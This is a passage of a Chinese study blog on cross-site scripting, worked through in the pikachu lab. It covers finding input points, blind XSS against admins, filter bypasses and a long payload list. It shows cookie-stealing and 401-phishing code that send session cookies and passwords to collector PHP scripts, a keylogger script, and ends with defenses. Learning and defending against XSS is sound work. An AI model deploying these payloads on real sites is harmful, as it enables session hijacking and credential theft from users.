+<p>1）漏洞挖掘，寻找输入点。</p>
+<p>2）寻找输出点。</p>
+<p>3）确定测试数据输出位置。</p>
+<p>4）输入简单的跨站代码进行测试。</p>
+</blockquote>
+<h5 id="存储型xss测试"><a href="#存储型xss测试" class="headerlink" title="存储型xss测试"></a>存储型xss测试</h5><h6 id="1-寻找输入点"><a href="#1-寻找输入点" class="headerlink" title="1.寻找输入点"></a>1.寻找输入点</h6><p>攻击者通过提交参数，意图修改当前页面的HTML结构。XSS攻击成功时，提交的参数格式可在当前页面拼接成可执行的脚本。</p>
+<p>可见，XSS漏洞存在的要求就是：当前页面存在参数显示点，且参数显示点可被用户控制输入。因此，<strong>寻找用户端可控的输入点</strong>是XSS攻击成功的第一步。</p>
+<blockquote>
+<p>一般发生在留言板、在线信箱、评论栏等处，表现特征是用户可自行输入数据，并且数据会提交给服务器。通常可以通过观察页面的交互行为来确定输入点。通常情况下，要求可提交数据量至少在20字符以上，否则JavaScript脚本很难执行。在日常应用中，如留言板、在线信箱、评论栏等功能都允许用户输入100字左右，均能达到XSS攻击对允许输入字符的要求。</p>
+</blockquote>
+<p><strong>输入点位置</strong></p>
+<blockquote>
+<p>除了直接观察之外，利用Web代理工具抓包来查看提交参数也是寻找输入点的一个有效途径。在一些输入点隐蔽或者用户输入被JS脚本限制的页面，可以采用Brupsuite抓包的方式寻找输入点。通过直接抓取HTTP包，观察里面是否有隐藏参数，并且对隐藏参数在页面上进行定位，即可找到输入点位置。</p>
+</blockquote>
+<h6 id="2-测试输出位置"><a href="#2-测试输出位置" class="headerlink" title="2.测试输出位置"></a>2.测试输出位置</h6><p>测试主要基于两个目的：</p>
+<p>1）确定网站对输入内容是否进行了输出，判断是否可以展开XSS攻击。</p>
+<p>2）有时候需要根据输出的位置的HTML环境来编写有效的XSS代码。</p>
+<p>一般留言板这些，输出位置很明显。</p>
+<h6 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h6><p>如<strong>果不回显</strong>的话（内容可能不会在前台展示，或者需要一定的时间通过人工审核后才能展示）</p>
+<p>除了凭借经验外，还可以尝试XSS攻击窃取Cookie，后台审核的一般是管理账户，若测试成功可能直接获得管理权限，但直接对管理员实施的XSS攻击也增加了<strong>被发现</strong>的风险。这也就是俗称的“<strong>XSS盲打后台</strong>”。</p>
+<p>XSS盲打的目标功能点通常有：</p>
+<blockquote>
+<p>·留言板</p>
+<p>·意见反馈点</p>
+<p>·私信功能</p>
+<p>·文件上传点中的信息输入框</p>
+<p>·在线提交信息等</p>
+</blockquote>
+<p>XSS盲打的目标是找到输入点插入跨站代码，并且要求插入的代码由管理员在正常Web应用流程中触发。因此，<strong>如何寻找与管理员的“互动”成为关键点。</strong></p>
+<p>该漏洞见pikachu靶场。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617002032118.png" alt="管理员登录后台查看留言板"></p>
+<h6 id="3-测试基本跨站代码"><a href="#3-测试基本跨站代码" class="headerlink" title="3.测试基本跨站代码"></a>3.测试基本跨站代码</h6><p>测试XSS攻击的经典方式就是“弹窗测试”，即在输入中插入一段可以产生弹窗效果的JavaScript脚本，如果刷新页面产生了弹窗，表明XSS攻击测试成功。</p>
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，提交后，刷新页面，出现弹窗说明存在xss。</p>
+<h4 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2.绕过思路"></a>2.绕过思路</h4><p>以下只提供理论，实践请配合xss-labs靶场使用。</p>
+<h5 id="1-闭合标签测试"><a href="#1-闭合标签测试" class="headerlink" title="1.闭合标签测试"></a>1.闭合标签测试</h5><p>利用查看网页源代码功能，如果内容输出在标签内。采取闭合方法。</p>
+<h5 id="2-大小写混合测试"><a href="#2-大小写混合测试" class="headerlink" title="2.大小写混合测试"></a>2.大小写混合测试</h5><h5 id="3-多重嵌套测试"><a href="#3-多重嵌套测试" class="headerlink" title="3.多重嵌套测试"></a>3.多重嵌套测试</h5><p>顾名思义，如果&lt;script&gt;标签被自动删除，构造攻击代码为&lt;scr&lt;script&gt;ipt&gt;试试。</p>
+<h5 id="4-宽字节绕过测试"><a href="#4-宽字节绕过测试" class="headerlink" title="4.宽字节绕过测试"></a>4.宽字节绕过测试</h5><p>如果目标服务器采取了黑名单+强制转换格式+多重嵌套过滤手段，那么仅通过对脚本中的关键词做基本变形已无法绕过防护机制。</p>
+<p>后续的有效思路在于尝试提交的关键词绝对不能与黑名单中的关键词重合，也就是说，<strong>提交的参数应避免触发黑名单机制</strong>。这里会利用宽字节的测试手段。</p>
+<h6 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h6><blockquote>
+<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等都是常用的宽字节编码，这类编码方案在针对字符进行编码时利用两字节进行编码。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象</p>
+</blockquote>
+<h6 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h6><blockquote>
+<p>GBK编码存在宽字节的问题，主要表现为GBK编码第一字节（高字节）的范围是0x81～0xFE，第二字节（低字节）的范围是0x40～0x7E与0x80～0xFE。GBK就是以这样的十六进制来针对字符进行编码。在GBK编码中，“\”符号的十六进制表示为0x5C，正好在GBK的低字节中。</p>
+<p>如果在后面添加一个高字节编码，那么添加的高字节编码会与原有编码组合成一个合法字符。</p>
+</blockquote>
+<p>你要闭合，发现，引号等参数被转义了。</p>
+<p>比如<code>&#39;;sdsdsd&#39;</code>结果为<strong>\‘;.</strong>..</p>
+<p>而宽字节绕过为：</p>
+<p><code>%bf&#39;;&lt;script&gt;alert(/xss/)&lt;/script&gt;;//</code></p>
+<p>分析一下：</p>
+<p>%bf在GBK编码的高字节范围，与后台转义单引号（’）生成的斜杠（\）相结合，正好组成了汉字“縗”的GBK编码，这个时候斜杠对单引号的转义效果便失效了，当然了，现在一般都采用utf-8，这种漏洞环境就少见了。</p>
+<h5 id="5-多标签测试"><a href="#5-多标签测试" class="headerlink" title="5.多标签测试"></a>5.多标签测试</h5><p>能够触发弹窗效果的远不止&lt;script&gt;这一种标签</p>
+<p>各类语法如下：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&gt;&lt;iframe src=http://XXX.XXX&gt;</span><br><span class="line">&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))</span><br><span class="line">&gt;//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//</span><br><span class="line">&gt;--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#x27;XSS&#x27;&quot;)`&gt;</span><br><span class="line">&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav??? ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&gt;&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\</span><br><span class="line">&gt;0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029&#x27;\</span><br><span class="line">&gt;0029&quot;&gt;</span><br><span class="line">&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&gt;%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&gt;&#x27;; alert(document.cookie); var foo=&#x27;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>语句失效是难免的，主要是了解构造原理。</p>
+<p>XSS语句的基本特点是利用各类JS脚本特性来设计触发点，攻击代码则可利用各类型编码或者外部引用方式进行加载。</p>
+<blockquote>
+<p>IE\Chrome\Firefox浏览器中的XSS Filter（针对XSS攻击的过滤器）包含语句非常全面。</p>
+<p>过滤机制在于会<strong>提前识别</strong>post或get方法传递参数过滤中是否存在跨站代码，再根据服务器的响应包内容进行判断，如果存在则禁止显示。</p>
+</blockquote>
+<h4 id="3-测试总结"><a href="#3-测试总结" class="headerlink" title="3.测试总结"></a>3.测试总结</h4><p>学到了挖洞流程，在测试过程中，先判断漏洞存在的基本环境、条件，再构造XSS语句。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617001208515.png" alt="xss漏洞测试总结"></p>
+<h3 id="8-利用方式"><a href="#8-利用方式" class="headerlink" title="8.利用方式"></a>8.利用方式</h3><p>弹窗测试只是用来证明XSS的存在，但远远不能说明XSS的危害。</p>
+<p>但是OWASP TOP10多次把XSS威胁列在前位。</p>
+<p>常见利用方式如下。</p>
+<h5 id="1-窃取Cookie"><a href="#1-窃取Cookie" class="headerlink" title="1.窃取Cookie"></a>1.窃取Cookie</h5><blockquote>
+<p>由于HTTP的特性，Cookie是目前Web系统识别用户身份和会话保存状态的主要方式。一旦应用程序中存在跨站脚本执行漏洞，那么攻击者就能利用XSS攻击轻而易举地获取被攻击者的Cookie信息，<strong>并伪装成当前用户登录，执行恶意操作等行为</strong>。</p>
+<p>如果受害用户是管理员，那么攻击者甚至可以轻易地获取Web系统的管理权限。这类权限通常会有文件修改、上传，连接数据库等功能，再配合后续的攻击，会给当前Web应用安全带来很大的威胁。</p>
+</blockquote>
+<p>假设攻击者在一个常规运行的网站的留言板上发现了一个存储型的XSS漏洞，那么攻击者就可以使用下面的代码进行跨站攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://localhost:81/pikachu/vul/xss/xssblind/test.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户浏览到留言板上的这条信息时，浏览器会加载这段留言信息，从而触发了这个JS攻击脚本。攻击脚本便会读取该正常网站下的用户Cookie，并将Cookie作为参数以GET方式提交到攻击者的远程服务器<a href="http://www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：">www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$log = fopen(&quot;../cookie.txt&quot;,&quot;a&quot;);//写了个目录路径</span><br><span class="line">Fwrite($log,$cookie.&quot;/n&quot;);</span><br><span class="line">Fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当有用户触发攻击时，攻击者服务器中的cookie.php便会接收受害者传入的Cookie，并保存在本地文件cookie.txt中。若Cookie还在有效期内，攻击者便可以利用该Cookie伪装成受害用户进行登录，进行非法操作。</p>
+<p><strong>这里怎么触发呢？我按照要求在pikachu的xss盲打同目录下建立了test.php用来将cookie存起来，噢，代码就没有弹cookie嘞</strong></p>
+<p>反射型可以，确实txt文件中添加到了。</p>
+<h5 id="2-钓鱼攻击"><a href="#2-钓鱼攻击" class="headerlink" title="2.钓鱼攻击"></a>2.钓鱼攻击</h5><p>攻击者精心构造的跨站代码可以实现更多功能，诸如改变网站的前端页面、构造虚假的表单来诱导用户填写信息等。如果攻击者利用一个正规网站的XSS漏洞来伪造一个钓鱼页面，那么与传统的钓鱼网站相比，从客户端浏览器的地址栏看起来XSS伪造的钓鱼页面属于该正规网站，具有非常强的迷惑性。</p>
+<blockquote>
+<p>像以前的qq环境，有人给你私聊或者是空间留言，伴随了一个陌生链接，引起你的好奇心，点进了一个网址，这个网址居然是网页版的qq登录界面，登录进去后发现什么也没有。第二天，你的qq就出现异地登录了。</p>
+</blockquote>
+<h6 id="利用401认证实现用户信息钓鱼"><a href="#利用401认证实现用户信息钓鱼" class="headerlink" title="利用401认证实现用户信息钓鱼"></a>利用401认证实现用户信息钓鱼</h6><p>我以pikachu的存储性xss为例，达到的目的是，留言板上触发脚本，弹出认证窗口，输入的用户名和密码，再由另一个php文件保存。</p>
+<p>首先写好一个auth.php文件，目的是认证窗口，要求用户重新输入用户名和密码，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 检查变量 $PHP_AUTH_USER 和$PHP_AUTH_PW 的值*/</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line"><span class="comment">/* 空值：发送产生显示文本框的数据头部*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate:Basic realm=&quot;&#x27;</span>.<span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;</span><br><span class="line"><span class="comment">/* 变量值存在，检查其是否正确 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//结果发送给接收消息的后台</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://localhost:81/pikachu/vul/xss/xssblind/index.php?username=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&amp;password=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其次，写一个index.php通过get()方式获取远端传输过来的账号和密码</p>
+<p>当然了，为什么用GET。</p>
+<p>凭据都是通过请求头部发送的，而不是通过请求体进行传递。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;	</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$referer</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$referer</span>.=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;D:/phpstudy_pro/WWW/pikachu/vul/xss/xssblind/user.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$username</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;/n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般是用数据库存储的，我这里用txt文件代替了。</p>
+<p>现在去留言板输入xss语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://localhost:81/pikachu/vul/xss/xssblind/auth.php?id=yVCEB3&amp;info=input+your+account&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617102614829.png"></p>
+<p>可惜，我反复停留在认证框，登录没法跳转。</p>
+<p><strong>所以我的index.php貌似触发不了，嘶，没道理诶。</strong>(chrom和firefox都不行，之后再看吧)</p>
+<p>当然了，以上php文件在pikachu的pkxss模块是有的，不需要自己写了。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44720762/article/details/89741520?ops_request_misc=%7B%22request_id%22:%22168696777416800225514033%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168696777416800225514033&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89741520-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA&spm=1018.2226.3001.4187"> XSS钓鱼攻击演示。_三块五的咸菜干的博客-CSDN博客</a></p>
+<h5 id="3-窃取客户端信息"><a href="#3-窃取客户端信息" class="headerlink" title="3.窃取客户端信息"></a>3.窃取客户端信息</h5><p>通过使用JS脚本，攻击者可以获取用户浏览器访问记录、IP地址、开放端口、剪贴板内容、按键记录等许多敏感信息，并将其发送到自己的服务器保存下来。</p>
+<h6 id="监听用户键盘动作"><a href="#监听用户键盘动作" class="headerlink" title="监听用户键盘动作"></a>监听用户键盘动作</h6><p>当用户在访问登录、注册、支付等页面时，在页面下的按键操作一般都是输入账号、密码等重要信息。如果攻击者在这些页面构造了跨站攻击脚本，便可记录用户的按键信息，并将信息传输到自己的远程服务器，那么用户的密码等资料便发生了泄漏。此处为了更好地演示效果，将监听到的用户按键直接采用网页弹窗弹出。构造的跨站代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var realkey = String.fromCharCode(event.keyCode);</span><br><span class="line">alert(realkey);&#125;</span><br><span class="line">document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还是提交到留言板上后，弹窗显示对应按键</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142543519.png" alt="按键监听"></p>
+<p>如果和钓鱼一样，把按键监听结果发送到远程服务器，啧啧。</p>
+<h3 id="9-标准防护方法"><a href="#9-标准防护方法" class="headerlink" title="9.标准防护方法"></a>9.标准防护方法</h3><p>已知XSS的原理就是：注入一段能够被浏览器解释执行的代码，并且通过各类手段使得这段代码“镶嵌”在正常网页中，由用户在正常访问中触发。</p>
+<p>防御的困难点在于：</p>
+<p>1.web浏览器本身就有很多安全问题，而浏览器又是xss的攻击主战场</p>
+<p>2.web应用程序有广泛的输入&#x2F;输出交互点</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142906722.png" alt="xss攻防流程图"></p>
+<p>虽然有过滤特殊字符代码，但还是存在一些绕过方式。</p>
+<h4 id="过滤特殊字符的绕过"><a href="#过滤特殊字符的绕过" class="headerlink" title="过滤特殊字符的绕过"></a>过滤特殊字符的绕过</h4><p>1.href属性中的伪协议</p>
+<p>&lt;a&gt;标签中利用href属性，在用户传入的参数前面加上http:&#x2F;&#x2F;来构成URL。但如果可成功利用传入的参数构造语句为“&lt;a href&#x3D;javascript：alert（’&#x2F;a&#x2F;‘）&gt;adas&lt;&#x2F;a&gt;”，则与直接执行javascript：alert（’&#x2F;a&#x2F;‘）的效果完全相同。</p>
+<p>如果冒号被过滤了：</p>
+<p>2.利用HTML实体化编码绕过过滤脚本</p>
+<p>将“javascript”中的字符“s”进行了实体化编码，对应的HTML实体化编码为&amp;#x73；</p>
+<p>3.HTML5新增标签</p>
+<p>对于黑名单可以寻找没有过滤的标签，如&lt;math&gt;标签的利用(firefox)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;math&gt;</span><br><span class="line">&lt;maction xlink:href=&quot;javascript:alert(/xss/)&quot;&gt;hello world&lt;/maction&gt;</span><br><span class="line">&lt;/math&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用实体化编码防御"><a href="#使用实体化编码防御" class="headerlink" title="使用实体化编码防御"></a>使用实体化编码防御</h4><p>有了这些特殊符号，攻击者就可以肆意地进行闭合标签、篡改页面、提交请求等行为。在输出内容之前，如果能够对特殊字符进行编码和转义，让浏览器能知道这些字符是被用作文字显示而不是作为代码执行，就会使攻击代码无法被浏览器执行。编码的方式有很多种，每种都适应于不同的环境。下面介绍两种常见的安全编码。</p>
+<p>1.HTML编码</p>
+<blockquote>
+<p>在PHP中，可以使用htmlspecialchars（）来进行编码，HTML是替换编码，告知浏览器哪些特殊字符只能作为文本显示，不能当作代码执行。从而规避了XSS风险。</p>
+</blockquote>
+<p>2.JavaScript编码</p>
+<blockquote>
+<p>用户的输入信息有时候会被嵌入JavaScript代码块中，也就是添加”\“进行了转义</p>
+</blockquote>
+<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>是Cookie的一项属性。如果一个Cookie值设置了这个属性，那么浏览器将禁止页面的JavaScript访问这个Cookie。窃取用户Cookie是攻击者利用XSS漏洞进行攻击的主要方式之一，如果JS脚本不具备读取Cookie的权限，那窃取用户Cookie的这项攻击也就宣告失败了。</p>
+<p>但这只是一个防止Cookie被恶意读取的设置，仅仅可阻碍跨站攻击行为偷取当前用户的Cookie信息，并没有从根本上解决XSS的问题。可以搭配以上措施使用。</p>
+<p>在PHP下开启HttpOnly的方式如下：</p>
+<p>1）找到PHP.ini，寻找并开启标签session.cookie_httponly&#x3D;true，从而开启全局的Cookie的HttpOnly属性。</p>
+<p>2）Cookie操作函数setcookie和setrawcookie专门添加了第7个参数来作为HttpOnly的选项，开启方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在实际应用中，HttpOnly没有被广泛使用，这是从业务便利性角度进行的选择。比如，在网站做广告推荐时，会利用JS脚本读取当前用户Cookie信息以作精准推广，如果开启HttpOnly，则上述效果会失效。</p>
+<h3 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h3><p>了解了xss的原理、条件、利用方式、绕过方式。</p>
+<p>XSS漏洞的核心问题在于当前页面<strong>没有明确区分用户参数与代码</strong>，导致由客户端提交的恶意代码会回显给客户端并且执行。</p>
+<p><strong>解决XSS漏洞的基本思路是过滤+实体化编码</strong>。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
